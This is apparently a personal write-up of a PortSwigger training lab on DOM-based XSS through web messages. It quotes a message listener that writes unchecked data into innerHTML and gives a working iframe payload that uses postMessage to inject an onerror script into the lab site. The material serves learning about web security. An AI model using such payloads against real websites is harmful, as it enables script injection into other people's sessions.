# [DOM XSS using web messages] — [PortSwigger] — [Practitioner]
**Date:** 2026-07-27
 
---
 
## Vulnerability / core concept
DOM-based XSS via Web Messages

---


## Payload / key command
This web application uses web messages to retrieve data; however, it does not check the origin of the sent message. On top of that, it add the received message inside sink `innerHTML`:
```html
<script>
    window.addEventListener('message', function(e) {
        document.getElementById('ads').innerHTML = e.data;
    })
</script>
```
To exploit this, we can generate the following `iframe` in our exploit server:
```hmtl
<iframe src="https://0a0b0010036e996180d1586800190072.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=. onerror=print()>', '*')"></iframe>
```
This `iframe` will load the vulnerable web application and on load it will send the message to this vulnerable web application through `this.contentWindow`. This is because this vulnerable web application does not check for the domain against some whitelist of allowed domains.

